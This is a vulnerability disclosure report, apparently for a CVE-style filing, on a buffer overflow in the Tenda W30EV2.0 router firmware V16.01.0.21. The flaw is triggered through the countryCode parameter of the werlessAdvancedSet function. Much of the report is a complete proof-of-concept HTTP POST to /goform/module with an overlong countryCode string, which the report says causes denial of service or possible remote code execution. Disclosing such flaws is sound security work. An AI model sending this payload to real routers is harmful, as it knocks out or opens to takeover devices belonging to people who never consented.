### REPORTING INFO
- Vendor: Tenda
- Product: Tenda W30EV2.0
- Version: V16.01.0.21
- Manufacturer's address: https://www.tendacn.com/
- Firmware download address: https://www.tenda.com.cn/prod/api/data/center/download/541288615886917/778343078879301

### Vulnerability details
Tenda W30EV2.0 V16.01.0.21 was found to contain a buffer_overflow vulnerability in the `werlessAdvancedSet` function via the `countryCode` parameter. This vulnerability allows attackers to cause DOS attack or remote code execution via a crafted request.

Function `werlessAdvancedSet`:
![repo_31](https://github.com/jsjbcyber/repo/blob/main/imgs/rep31.png)

Function `cgi_split_countrycode`:
![repo_32](https://github.com/jsjbcyber/repo/blob/main/imgs/rep32.png)

**POC**

```
POST /goform/module?1774654724185 HTTP/1.1
Host: 172.22.3.12
Content-Length: 94
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/plain, */*; q=0.01
Content-Type: application/json
Origin: http://172.22.3.12
Referer: http://172.22.3.12/index.html?v=0
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: bLanguage=cn; sessionid=W30EV2.0:48.1.2:92bcaa
Connection: keep-alive

{"setAdvancedSetList":{"countryCode":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}
```

![repo_33](https://github.com/jsjbcyber/repo/blob/main/imgs/rep33.png)
